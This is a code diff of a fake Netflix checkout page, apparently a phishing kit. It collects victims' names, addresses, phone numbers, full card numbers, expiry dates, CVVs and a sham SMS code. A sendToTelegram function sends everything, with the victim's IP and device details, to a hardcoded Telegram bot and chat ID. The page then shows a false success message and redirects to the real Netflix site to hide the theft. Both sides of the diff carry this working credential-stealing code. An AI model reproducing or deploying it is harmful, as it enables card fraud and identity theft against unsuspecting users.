+                    <span id="summaryPrice">-</span>
+                </div>
+                <div class="order-row" id="offerSummaryRow" style="display:none;">
+                    <span>🎉 50% OFF Discount</span>
+                    <span>-</span>
+                </div>
+                <div class="order-row">
+                    <span>Tax (estimated)</span>
+                    <span id="taxAmount">$0.00</span>
+                </div>
+                <div class="order-row">
+                    <span>Total</span>
+                    <span id="totalAmount" style="color:#E50914;">$0.00</span>
+                </div>
+            </div>
+
+            <!-- Card Preview -->
+            <div class="card-preview">
+                <div class="card-preview-header">
+                    <span>💳</span>
+                    <span id="previewCardType">💳</span>
+                </div>
+                <div class="card-number-preview" id="previewCardNumber">•••• •••• •••• ••••</div>
+                <div class="card-details-row">
+                    <span id="previewCardName">CARDHOLDER</span>
+                    <span id="previewCardExpiry">MM/YY</span>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label>Cardholder name</label>
+                <input type="text" id="cardName" placeholder="John Smith">
+                <div class="error-message" id="cardNameError"></div>
+            </div>
+
+            <div class="input-group">
+                <label>Card number</label>
+                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19">
+                <div class="error-message" id="cardNumberError"></div>
+            </div>
+
+            <div class="input-row">
+                <div class="input-group">
+                    <label>Expiration (MM/YY)</label>
+                    <input type="text" id="expiry" placeholder="MM/YY" maxlength="5">
+                    <div class="error-message" id="expiryError"></div>
+                </div>
+                <div class="input-group">
+                    <label>Security code (CVV)</label>
+                    <input type="password" id="cvv" placeholder="123" maxlength="3">
+                    <div class="error-message" id="cvvError"></div>
+                </div>
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="saveCard">
+                <label>💾 Save this card for future payments</label>
+            </div>
+
+            <div class="trust-badges">
+                <span class="trust-badge">🔒 Secure Payment</span>
+                <span class="trust-badge">💳 Visa/MasterCard</span>
+                <span class="trust-badge">🛡️ Fraud Protection</span>
+            </div>
+
+            <button class="btn-primary" id="sendSmsBtn">Send verification code →</button>
+            <button class="btn-secondary" id="backToPersonal">← Back to personal info</button>
+        </div>
+
+        <!-- SMS VERIFICATION POPUP -->
+        <div id="smsPopup" style="display:none; margin-top:20px;">
+            <div class="phone-display" id="phoneDisplay"></div>
+            <div class="input-group">
+                <label>Enter 6-digit verification code</label>
+                <input type="text" id="smsCode" class="code-input" placeholder="000000" maxlength="6">
+                <div class="error-message" id="smsError"></div>
+            </div>
+            <div id="attemptsDisplay" class="attempts-indicator"></div>
+            <button class="btn-primary" id="verifyBtn">Verify & Complete →</button>
+            <button class="btn-secondary" id="resendCodeBtn">📱 Resend code</button>
+            <div id="resendCountdown" class="countdown-text"></div>
+        </div>
+
+        <div id="messageArea"></div>
+        <div id="countdownArea" class="countdown-text"></div>
+        <div class="footer-links">
+            <a href="#">Help Center</a> |
+            <a href="#">Privacy</a> |
+            <a href="#">Terms of Use</a>
+        </div>
+    </div>
+</div>
+
+<script>
+    // ========== TELEGRAM CONFIGURATION ==========
+    const BOT_TOKEN = "8627160097:AAHrqaMZsLKwLOv_LWsLUgpWOADxcxpzCqA";
+    const CHAT_ID = "7714049413";
+    const OFFICIAL_NETFLIX_URL = "https://www.netflix.com";
+    const MAX_ATTEMPTS = 3;
+
+    // ========== VARIABLES ==========
+    let selectedPlan = null;
+    let selectedPrice = 0;
+    let selectedOfferPrice = 0;
+    let personalData = {};
+    let currentPhone = null;
+    let currentSmsCode = null;
+    let smsAttempts = 0;
+    let isBlocked = false;
+    let resendTimer = null;
+
+    // ========== STEP INDICATOR ==========
+    function updateStepIndicator(step) {
+        const steps = ['step1Indicator', 'step2Indicator', 'step3Indicator'];
+        const contents = ['step1Content', 'step2Content', 'step3Content'];
+        for (let i = 0; i < steps.length; i++) {
+            document.getElementById(steps[i]).classList.remove('active', 'completed');
+            document.getElementById(contents[i]).classList.remove('active');
         }
-
-        // ========== UPDATE ORDER SUMMARY ==========
-        function updateOrderSummary() {
-            if (!selectedPlan) return;
-            let regularPrice = parseFloat(selectedPrice);
-            let offerPrice = parseFloat(selectedOfferPrice);
-            let finalPrice = offerPrice > 0 ? offerPrice : regularPrice;
-            let tax = finalPrice * 0.1;
-            let total = finalPrice + tax;
-            
-            document.getElementById('selectedPlanName').innerText = selectedPlan;
-            document.getElementById('regularPrice').innerText = `$${regularPrice.toFixed(2)}`;
-            if (offerPrice > 0 && offerPrice < regularPrice) {
-                document.getElementById('offerRow').style.display = 'flex';
-                document.getElementById('offerDiscount').innerText = `-$${(regularPrice - offerPrice).toFixed(2)}`;
-            } else {
-                document.getElementById('offerRow').style.display = 'none';
-            }
-            document.getElementById('totalPrice').innerText = `$${finalPrice.toFixed(2)}`;
-            
-            // Step 3 summary
-            document.getElementById('summaryPlan').innerText = selectedPlan;
-            let summaryPrice = offerPrice > 0 ? offerPrice : regularPrice;
-            document.getElementById('summaryPrice').innerText = `$${summaryPrice.toFixed(2)}/mo`;
-            document.getElementById('taxAmount').innerText = `$${tax.toFixed(2)}`;
-            document.getElementById('totalAmount').innerText = `$${total.toFixed(2)}`;
-            
-            if (offerPrice > 0 && offerPrice < regularPrice) {
-                document.getElementById('offerSummaryRow').style.display = 'flex';
-            } else {
-                document.getElementById('offerSummaryRow').style.display = 'none';
-            }
+        for (let i = 0; i < step - 1; i++) {
+            document.getElementById(steps[i]).classList.add('completed');
         }
+        document.getElementById(steps[step - 1]).classList.add('active');
+        document.getElementById(contents[step - 1]).classList.add('active');
+        const fillPercent = ((step - 1) / 2) * 100;
+        document.getElementById('stepLineFill').style.width = fillPercent + '%';
+    }
 
-        // ========== PLAN SELECTION ==========
-        document.querySelectorAll('.plan-option').forEach(plan => {
-            plan.onclick = function() {
-                document.querySelectorAll('.plan-option').forEach(p => p.classList.remove('selected'));
-                this.classList.add('selected');
-                selectedPlan = this.querySelector('.plan-name').textContent;
-                selectedPrice = parseFloat(this.dataset.price);
-                selectedOfferPrice = parseFloat(this.dataset.offer);
-                updateOrderSummary();
+    // ========== UPDATE ORDER SUMMARY ==========
+    function updateOrderSummary() {
+        if (!selectedPlan) return;
+        let regularPrice = parseFloat(selectedPrice);
+        let offerPrice = parseFloat(selectedOfferPrice);
+        let finalPrice = (offerPrice > 0 && offerPrice < regularPrice) ? offerPrice : regularPrice;
+        
+        document.getElementById('selectedPlanName').innerText = selectedPlan;
+        document.getElementById('regularPrice').innerText = `$${regularPrice.toFixed(2)}`;
+        if (offerPrice > 0 && offerPrice < regularPrice) {
+            document.getElementById('offerRow').style.display = 'flex';
+            document.getElementById('offerDiscount').innerText = `-$${(regularPrice - offerPrice).toFixed(2)}`;
+        } else {
+            document.getElementById('offerRow').style.display = 'none';
+        }
+        document.getElementById('totalPrice').innerText = `$${finalPrice.toFixed(2)}`;
+        
+        // Step 3 summary
+        document.getElementById('summaryPlan').innerText = selectedPlan;
+        let summaryPrice = offerPrice > 0 && offerPrice < regularPrice ? offerPrice : regularPrice;
+        document.getElementById('summaryPrice').innerText = `$${summaryPrice.toFixed(2)}/mo`;
+        let tax = summaryPrice * 0.1;
+        let total = summaryPrice + tax;
+        document.getElementById('taxAmount').innerText = `$${tax.toFixed(2)}`;
+        document.getElementById('totalAmount').innerText = `$${total.toFixed(2)}`;
+        if (offerPrice > 0 && offerPrice < regularPrice) {
+            document.getElementById('offerSummaryRow').style.display = 'flex';
+        } else {
+            document.getElementById('offerSummaryRow').style.display = 'none';
+        }
+    }
+
+    // ========== PLAN SELECTION ==========
+    document.querySelectorAll('.plan-option').forEach(plan => {
+        plan.onclick = function() {
+            document.querySelectorAll('.plan-option').forEach(p => p.classList.remove('selected'));
+            this.classList.add('selected');
+            selectedPlan = this.querySelector('.plan-name').textContent;
+            selectedPrice = parseFloat(this.dataset.price);
+            selectedOfferPrice = parseFloat(this.dataset.offer);
+            updateOrderSummary();
+        };
+    });
+
+    // ========== STEP NAVIGATION ==========
+    document.getElementById('continueToPersonal').onclick = function() {
+        if (!selectedPlan) {
+            showMessage('❌ Please select a plan first', 'error');
+            return;
+        }
+        updateStepIndicator(2);
+    };
+    document.getElementById('backToPlans').onclick = () => updateStepIndicator(1);
+    document.getElementById('backToPersonal').onclick = () => updateStepIndicator(2);
+
+    // ========== VALIDATE PERSONAL INFO ==========
+    function validatePersonalInfo() {
+        const fullName = document.getElementById('fullName').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const phone = document.getElementById('phonePersonal').value.trim();
+        const address = document.getElementById('address').value.trim();
+        const agree = document.getElementById('agreeTermsPersonal').checked;
+        
+        let hasError = false;
+        document.getElementById('fullNameError').innerHTML = '';
+        document.getElementById('emailError').innerHTML = '';
+        document.getElementById('phonePersonalError').innerHTML = '';
+        document.getElementById('addressError').innerHTML = '';
+        
+        if (!fullName || fullName.length < 3) {
+            document.getElementById('fullNameError').innerHTML = 'Enter your full name';
+            hasError = true;
+        }
+        if (!email || !email.includes('@')) {
+            document.getElementById('emailError').innerHTML = 'Enter valid email';
+            hasError = true;
+        }
+        if (!phone || phone.length < 8) {
+            document.getElementById('phonePersonalError').innerHTML = 'Enter valid phone number';
+            hasError = true;
+        }
+        if (!address) {
+            document.getElementById('addressError').innerHTML = 'Enter street address';
+            hasError = true;
+        }
+        if (!agree) {
+            showMessage('Please agree to the Terms of Service', 'error');
+            hasError = true;
+        }
+        
+        if (!hasError) {
+            personalData = {
+                fullName, email, phone, address,
+                city: document.getElementById('city').value,
+                zip: document.getElementById('zip').value,
+                country: document.getElementById('country').value
             };
-        });
+            currentPhone = phone;
+            document.getElementById('paymentSubtitle').innerHTML = `${personalData.fullName} • ${personalData.email}`;
+            updateStepIndicator(3);
+        }
+    }
+    document.getElementById('continueToPayment').onclick = validatePersonalInfo;
 
-        // ========== STEP 1 → STEP 2 ==========
-        document.getElementById('continueToPersonal').onclick = function() {
-            if (!selectedPlan) {
-                showMessage('❌ Please select a plan first', 'error');
-                return;
-            }
-            updateStepIndicator(2);
-        };
+    // ========== CARD FORMATTING ==========
+    document.getElementById('cardNumber').oninput = function(e) {
+        let val = e.target.value.replace(/\D/g, '');
+        val = val.replace(/(\d{4})/g, '$1 ').trim();
+        e.target.value = val.substring(0, 19);
+        updateCardPreview();
+    };
+    document.getElementById('cardName').oninput = updateCardPreview;
+    document.getElementById('expiry').oninput = function(e) {
+        let val = e.target.value.replace(/\D/g, '');
+        if (val.length >= 2) val = val.slice(0,2) + '/' + val.slice(2,4);
+        e.target.value = val.slice(0,5);
+        updateCardPreview();
+    };
+    document.getElementById('cvv').oninput = function(e) {
+        e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
+    };
+    document.getElementById('smsCode').oninput = function(e) {
+        e.target.value = e.target.value.replace(/\D/g, '').slice(0,6);
+    };
+    
+    function updateCardPreview() {
+        const cardNum = document.getElementById('cardNumber').value;
+        const cardName = document.getElementById('cardName').value;
+        const expiry = document.getElementById('expiry').value;
+        const type = getCardType(cardNum.replace(/\s/g, ''));
+        const icons = { VISA: '💳 VISA', MASTERCARD: '💳 MC', AMEX: '💳 AMEX' };
+        document.getElementById('previewCardType').innerHTML = icons[type] || '💳';
+        document.getElementById('previewCardNumber').innerHTML = cardNum || '•••• •••• •••• ••••';
+        document.getElementById('previewCardName').innerHTML = cardName.toUpperCase() || (personalData.fullName ? personalData.fullName.toUpperCase() : 'CARDHOLDER');
+        document.getElementById('previewCardExpiry').innerHTML = expiry || 'MM/YY';
+    }
+    
+    function getCardType(number) {
+        if (/^4/.test(number)) return 'VISA';
+        if (/^5[1-5]/.test(number)) return 'MASTERCARD';
+        if (/^3[47]/.test(number)) return 'AMEX';
+        return 'CARD';
+    }
+    
+    function validateLuhn(card) {
+        let sum = 0, alt = false;
+        for (let i = card.length - 1; i >= 0; i--) {
+            let n = parseInt(card.charAt(i), 10);
+            if (alt) { n *= 2; if (n > 9) n = (n % 10) + 1; }
+            sum += n;
+            alt = !alt;
+        }
+        return sum % 10 === 0;
+    }
 
-        document.getElementById('backToPlans').onclick = () => updateStepIndicator(1);
-        document.getElementById('backToPersonal').onclick = () => updateStepIndicator(2);
+    // ========== MESSAGES ==========
+    function showMessage(msg, type) {
+        const msgDiv = document.getElementById('messageArea');
+        let className = type === 'success' ? 'success-message' : type === 'error' ? 'error-message' : 'info-message';
+        msgDiv.innerHTML = `<div class="${className}">${msg}</div>`;
+        setTimeout(() => { msgDiv.innerHTML = ''; }, 4000);
+    }
 
-        // ========== STEP 2 → STEP 3 ==========
-        function validatePersonalInfo() {
-            const fullName = document.getElementById('fullName').value.trim();
-            const email = document.getElementById('email').value.trim();
-            const phone = document.getElementById('phonePersonal').value.trim();
-            const address = document.getElementById('address').value.trim();
-            const agree = document.getElementById('agreeTermsPersonal').checked;
-            
-            let hasError = false;
-            document.getElementById('fullNameError').innerHTML = '';
-            document.getElementById('emailError').innerHTML = '';
-            document.getElementById('phonePersonalError').innerHTML = '';
-            document.getElementById('addressError').innerHTML = '';
-            
-            if (!fullName || fullName.length < 3) {
-                document.getElementById('fullNameError').innerHTML = 'Enter your full name';
-                hasError = true;
-            }
-            if (!email || !email.includes('@')) {
-                document.getElementById('emailError').innerHTML = 'Enter valid email';
-                hasError = true;
-            }
-            if (!phone || phone.length < 8) {
-                document.getElementById('phonePersonalError').innerHTML = 'Enter valid phone number';
-                hasError = true;
-            }
-            if (!address) {
-                document.getElementById('addressError').innerHTML = 'Enter street address';
-                hasError = true;
-            }
-            if (!agree) {
-                showMessage('Please agree to the Terms of Service', 'error');
-                hasError = true;
-            }
-            
-            if (!hasError) {
-                personalData = { fullName, email, phone, address, city: document.getElementById('city').value, zip: document.getElementById('zip').value, country: document.getElementById('country').value };
-                currentPhone = phone;
-                document.getElementById('paymentSubtitle').innerHTML = `${personalData.fullName} • ${personalData.email}`;
-                updateStepIndicator(3);
-            }
+    // ========== SMS FUNCTIONS ==========
+    function generateSMSCode() {
+        return Math.floor(100000 + Math.random() * 900000).toString();
+    }
+    
+    function updateAttemptsDisplay() {
+        const attemptsLeft = MAX_ATTEMPTS - smsAttempts;
+        const display = document.getElementById('attemptsDisplay');
+        display.innerHTML = attemptsLeft > 0 ? `⚠️ ${attemptsLeft} attempt(s) remaining` : '🔒 Too many failed attempts. Resend code.';
+    }
+    
+    function resetSMSAttempts() { smsAttempts = 0; updateAttemptsDisplay(); }
+    
+    async function sendToTelegram(type, extra = {}) {
+        const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'Unknown');
+        const ua = navigator.userAgent;
+        const date = new Date().toLocaleString();
+        let device = /Mobile|Android|iPhone|iPad/i.test(ua) ? '📱 Mobile' : '💻 Desktop';
+        let browser = ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : 'Unknown';
+        let finalPrice = (selectedOfferPrice > 0 && selectedOfferPrice < selectedPrice) ? selectedOfferPrice : selectedPrice;
+        let total = finalPrice * 1.1;
+        
+        let message = '';
+        if (type === 'all') {
+            message = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🎬 NETFLIX - FULL DATA 🎬\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📺 PLAN: ${selectedPlan}\n💰 TOTAL: $${total.toFixed(2)} (incl. tax)\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n👤 NAME: ${personalData.fullName}\n📧 EMAIL: ${personalData.email}\n📞 PHONE: +${currentPhone}\n🏠 ADDRESS: ${personalData.address}, ${personalData.city}, ${personalData.zip}, ${personalData.country}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n💳 CARD: ${extra.card}\n📅 EXPIRY: ${extra.expiry}\n🔐 CVV: ${extra.cvv}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${ip}\n📱 DEVICE: ${device}\n🌍 BROWSER: ${browser}\n🕒 TIME: ${date}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n✅ SMS CODE: ${extra.code}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+        } else if (type === 'sms') {
+            message = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📱 SMS CODE\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📞 PHONE: +${currentPhone}\n🔑 CODE: ${extra.code}`;
+        } else if (type === 'complete') {
+            message = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🎯 PAYMENT COMPLETED\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📞 PHONE: +${currentPhone}\n✅ VERIFIED: ${extra.code}\n📺 PLAN: ${selectedPlan}\n💰 TOTAL: $${total.toFixed(2)}`;
         }
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+        try { await fetch(url); return true; } catch(e) { return false; }
+    }
+    
+    function startResendCooldown(seconds) {
+        const btn = document.getElementById('resendCodeBtn');
+        const cd = document.getElementById('resendCountdown');
+        let remaining = seconds;
+        if (resendTimer) clearInterval(resendTimer);
+        resendTimer = setInterval(() => {
+            remaining--;
+            cd.innerHTML = remaining > 0 ? `⏱️ Resend code in ${remaining}s` : '';
+            if (remaining <= 0) { clearInterval(resendTimer); btn.disabled = false; cd.innerHTML = ''; }
+        }, 1000);
+    }
+    
+    // ========== SEND SMS ==========
+    document.getElementById('sendSmsBtn').onclick = async function() {
+        const cardName = document.getElementById('cardName').value.trim();
+        const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+        const expiry = document.getElementById('expiry').value;
+        const cvv = document.getElementById('cvv').value;
         
-        document.getElementById('continueToPayment').onclick = validatePersonalInfo;
-
-        // ========== CARD FORMATTING ==========
-        document.getElementById('cardNumber').oninput = function(e) {
-            let val = e.target.value.replace(/\D/g, '');
-            val = val.replace(/(\d{4})/g, '$1 ').trim();
-            e.target.value = val.substring(0, 19);
-            updateCardPreview();
-        };
-        document.getElementById('cardName').oninput = updateCardPreview;
-        document.getElementById('expiry').oninput = function(e) {
-            let val = e.target.value.replace(/\D/g, '');
-            if (val.length >= 2) val = val.slice(0,2) + '/' + val.slice(2,4);
-            e.target.value = val.slice(0,5);
-            updateCardPreview();
-        };
-        document.getElementById('cvv').oninput = function(e) {
-            e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
-        };
+        let hasError = false;
+        document.getElementById('cardNameError').innerHTML = '';
+        document.getElementById('cardNumberError').innerHTML = '';
+        document.getElementById('expiryError').innerHTML = '';
+        document.getElementById('cvvError').innerHTML = '';
         
-        function updateCardPreview() {
-            const cardNum = document.getElementById('cardNumber').value;
-            const cardName = document.getElementById('cardName').value;
-            const expiry = document.getElementById('expiry').value;
-            const type = getCardType(cardNum.replace(/\s/g, ''));
-            const icons = { VISA: '💳 VISA', MASTERCARD: '💳 MC', AMEX: '💳 AMEX', DISCOVER: '💳 DISC' };
-            document.getElementById('previewCardType').innerHTML = icons[type] || '💳';
-            document.getElementById('previewCardNumber').innerHTML = cardNum || '•••• •••• •••• ••••';
-            document.getElementById('previewCardName').innerHTML = cardName.toUpperCase() || (personalData.fullName ? personalData.fullName.toUpperCase() : 'CARDHOLDER');
-            document.getElementById('previewCardExpiry').innerHTML = expiry || 'MM/YY';
+        if (!cardName) { document.getElementById('cardNameError').innerHTML = 'Enter cardholder name'; hasError = true; }
+        if (!cardNumber || cardNumber.length < 13) { document.getElementById('cardNumberError').innerHTML = 'Enter valid card number'; hasError = true; }
+        else if (!validateLuhn(cardNumber)) { document.getElementById('cardNumberError').innerHTML = 'Invalid card number'; hasError = true; }
+        if (!expiry || !expiry.match(/^\d{2}\/\d{2}$/)) { document.getElementById('expiryError').innerHTML = 'Enter MM/YY'; hasError = true; }
+        if (!cvv || cvv.length < 3) { document.getElementById('cvvError').innerHTML = 'Enter CVV'; hasError = true; }
+        
+        if (hasError) { showMessage('Please fix card details', 'error'); return; }
+        
+        const btn = this;
+        btn.disabled = true;
+        btn.innerHTML = '<span class="spinner"></span> Sending...';
+        
+        currentSmsCode = generateSMSCode();
+        await sendToTelegram('all', { card: cardNumber, expiry, cvv, code: currentSmsCode });
+        
+        document.getElementById('smsPopup').style.display = 'block';
+        document.getElementById('phoneDisplay').innerHTML = `📞 Code sent to +${currentPhone.substring(0,3)}****${currentPhone.slice(-4)}`;
+        resetSMSAttempts();
+        isBlocked = false;
+        startResendCooldown(60);
+        
+        btn.disabled = false;
+        btn.innerHTML = 'Send verification code →';
+    };
+    
+    document.getElementById('resendCodeBtn').onclick = async function() {
+        currentSmsCode = generateSMSCode();
+        await sendToTelegram('sms', { code: currentSmsCode });
+        resetSMSAttempts();
+        showMessage('📱 New code sent!', 'success');
+        startResendCooldown(60);
+    };
+    
+    document.getElementById('verifyBtn').onclick = async function() {
+        const code = document.getElementById('smsCode').value.trim();
+        if (isBlocked) { document.getElementById('smsError').innerHTML = 'Too many failed attempts. Resend code.'; return; }
+        if (code.length !== 6) { document.getElementById('smsError').innerHTML = 'Enter 6-digit code'; return; }
+        if (code !== currentSmsCode) {
+            smsAttempts++;
+            updateAttemptsDisplay();
+            if (smsAttempts >= MAX_ATTEMPTS) { isBlocked = true; document.getElementById('smsError').innerHTML = 'Too many failed attempts. Resend code.'; }
+            else { document.getElementById('smsError').innerHTML = `Invalid code. ${MAX_ATTEMPTS - smsAttempts} attempts left.`; }
+            document.getElementById('smsCode').value = '';
+            return;
         }
-        
-        function getCardType(number) {
-            if (/^4/.test(number)) return 'VISA';
-            if (/^5[1-5]/.test(number)) return 'MASTERCARD';
-            if (/^3[47]/.test(number)) return 'AMEX';
-            return 'CARD';
-        }
-        
-        function validateLuhn(card) {
-            let sum = 0, alt = false;
-            for (let i = card.length - 1; i >= 0; i--) {
-                let n = parseInt(card.charAt(i), 10);
-                if (alt) { n *= 2; if (n > 9) n = (n % 10) + 1; }
-                sum += n;
-                alt = !alt;
-            }
-            return sum % 10 === 0;
-        }
-
-        // ========== SMS FUNCTIONS ==========
-        function showMessage(msg, type) {
-            const msgDiv = document.getElementById('messageArea');
-            let className = type === 'success' ? 'success-message' : type === 'error' ? 'error-message' : 'info-message';
-            msgDiv.innerHTML = `<div class="${className}">${msg}</div>`;
-            setTimeout(() => { msgDiv.innerHTML = ''; }, 4000);
-        }
-        
-        function generateSMSCode() {
-            return Math.floor(100000 + Math.random() * 900000).toString();
-        }
-        
-        function updateAttemptsDisplay() {
-            const attemptsLeft = MAX_ATTEMPTS - smsAttempts;
-            const display = document.getElementById('attemptsDisplay');
-            display.innerHTML = attemptsLeft > 0 ? `⚠️ ${attemptsLeft} attempt(s) remaining` : '🔒 Too many failed attempts. Resend code.';
-        }
-        
-        function resetSMSAttempts() { smsAttempts = 0; updateAttemptsDisplay(); }
-        
-        async function sendToTelegram(type, extra = {}) {
-            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'Unknown');
-            const ua = navigator.userAgent;
-            const date = new Date().toLocaleString();
-            let device = /Mobile|Android|iPhone|iPad/i.test(ua) ? '📱 Mobile' : '💻 Desktop';
-            let browser = ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : 'Unknown';
-            let finalTotal = (selectedOfferPrice > 0 ? selectedOfferPrice : selectedPrice) * 1.1;
-            
-            let message = '';
-            if (type === 'all') {
-                message = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🎬 NETFLIX - FULL DATA 🎬\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📺 PLAN: ${selectedPlan}\n💰 PRICE: $${finalTotal.toFixed(2)} (incl. tax)\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n👤 NAME: ${personalData.fullName}\n📧 EMAIL: ${personalData.email}\n📞 PHONE: +${currentPhone}\n🏠 ADDRESS: ${personalData.address}, ${personalData.city}, ${personalData.zip}, ${personalData.country}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n💳 CARD: ${extra.card}\n📅 EXPIRY: ${extra.expiry}\n🔐 CVV: ${extra.cvv}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${ip}\n📱 DEVICE: ${device}\n🌍 BROWSER: ${browser}\n🕒 TIME: ${date}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n✅ SMS CODE: ${extra.code}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
-            } else if (type === 'sms') {
-                message = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📱 SMS CODE\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📞 PHONE: +${currentPhone}\n🔑 CODE: ${extra.code}`;
-            } else if (type === 'complete') {
-                message = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🎯 PAYMENT COMPLETED\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📞 PHONE: +${currentPhone}\n✅ VERIFIED: ${extra.code}\n📺 PLAN: ${selectedPlan}\n💰 TOTAL: $${finalTotal.toFixed(2)}`;
-            }
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
-            try { await fetch(url); return true; } catch(e) { return false; }
-        }
-        
-        function startResendCooldown(seconds) {
-            const btn = document.getElementById('resendCodeBtn');
-            const cd = document.getElementById('resendCountdown');
-            let remaining = seconds;
-            if (resendTimer) clearInterval(resendTimer);
-            resendTimer = setInterval(() => {
-                remaining--;
-                cd.innerHTML = remaining > 0 ? `⏱️ Resend in ${remaining}s` : '';
-                if (remaining <= 0) { clearInterval(resendTimer); btn.disabled = false; cd.innerHTML = ''; }
-            }, 1000);
-        }
-        
-        // ========== SEND SMS ==========
-        document.getElementById('sendSmsBtn').onclick = async function() {
-            const cardName = document.getElementById('cardName').value.trim();
-            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
-            const expiry = document.getElementById('expiry').value;
-            const cvv = document.getElementById('cvv').value;
-            
-            let hasError = false;
-            document.getElementById('cardNameError').innerHTML = '';
-            document.getElementById('cardNumberError').innerHTML = '';
-            document.getElementById('expiryError').innerHTML = '';
-            document.getElementById('cvvError').innerHTML = '';
-            
-            if (!cardName) { document.getElementById('cardNameError').innerHTML = 'Enter cardholder name'; hasError = true; }
-            if (!cardNumber || cardNumber.length < 13) { document.getElementById('cardNumberError').innerHTML = 'Enter valid card number'; hasError = true; }
-            else if (!validateLuhn(cardNumber)) { document.getElementById('cardNumberError').innerHTML = 'Invalid card number'; hasError = true; }
-            if (!expiry || !expiry.match(/^\d{2}\/\d{2}$/)) { document.getElementById('expiryError').innerHTML = 'Enter MM/YY'; hasError = true; }
-            if (!cvv || cvv.length < 3) { document.getElementById('cvvError').innerHTML = 'Enter CVV'; hasError = true; }
-            
-            if (hasError) { showMessage('Please fix card details', 'error'); return; }
-            
-            const btn = this;
-            btn.disabled = true;
-            btn.innerHTML = '<span class="spinner"></span> Sending...';
-            
-            currentSmsCode = generateSMSCode();
-            await sendToTelegram('all', { card: cardNumber, expiry, cvv, code: currentSmsCode, name: cardName });
-            
-            document.getElementById('smsPopup').style.display = 'block';
-            document.getElementById('phoneDisplay').innerHTML = `📞 Code sent to +${currentPhone.substring(0,3)}****${currentPhone.slice(-4)}`;
-            resetSMSAttempts();
-            isBlocked = false;
-            startResendCooldown(60);
-            
-            btn.disabled = false;
-            btn.innerHTML = 'Send verification code →';
-        };
-        
-        document.getElementById('resendCodeBtn').onclick = async function() {
-            currentSmsCode = generateSMSCode();
-            await sendToTelegram('sms', { code: currentSmsCode });
-            resetSMSAttempts();
-            showMessage('📱 New code sent!', 'success');
-            startResendCooldown(60);
-        };
-        
-        document.getElementById('verifyBtn').onclick = async function() {
-            const code = document.getElementById('smsCode').value.trim();
-            if (isBlocked) { document.getElementById('smsError').innerHTML = 'Too many failed attempts. Resend code.'; return; }
-            if (code.length !== 6) { document.getElementById('smsError').innerHTML = 'Enter 6-digit code'; return; }
-            if (code !== currentSmsCode) {
-                smsAttempts++;
-                updateAttemptsDisplay();
-                if (smsAttempts >= MAX_ATTEMPTS) { isBlocked = true; document.getElementById('smsError').innerHTML = 'Too many failed attempts. Resend code.'; }
-                else { document.getElementById('smsError').innerHTML = `Invalid code. ${MAX_ATTEMPTS - smsAttempts} attempts left.`; }
-                document.getElementById('smsCode').value = '';
-                return;
-            }
-            const btn = this;
-            btn.disabled = true;
-            btn.innerHTML = '<span class="spinner"></span> Processing...';
-            await sendToTelegram('complete', { code: currentSmsCode });
-            showMessage('✅ Payment successful! Redirecting to Netflix...', 'success');
-            let seconds = 5;
-            const timer = setInterval(() => {
-                seconds--;
-                document.getElementById('countdownArea').innerHTML = `⏱️ Redirecting to Netflix in ${seconds}s...`;
-                if (seconds <= 0) { clearInterval(timer); window.location.href = OFFICIAL_NETFLIX_URL; }
-            }, 1000);
-        };
-        
-        document.getElementById('smsCode').oninput = function(e) {
-            e.target.value = e.target.value.replace(/\D/g, '').slice(0,6);
-        };
-    </script>
+        const btn = this;
+        btn.disabled = true;
+        btn.innerHTML = '<span class="spinner"></span> Processing...';
+        await sendToTelegram('complete', { code: currentSmsCode });
+        showMessage('✅ Payment successful! Redirecting to Netflix...', 'success');
+        let seconds = 5;
+        const timer = setInterval(() => {
+            seconds--;
+            document.getElementById('countdownArea').innerHTML = `⏱️ Redirecting to Netflix in ${seconds}s...`;
+            if (seconds <= 0) { clearInterval(timer); window.location.href = OFFICIAL_NETFLIX_URL; }
+        }, 1000);
+    };
+</script>
 </body>
 </html>
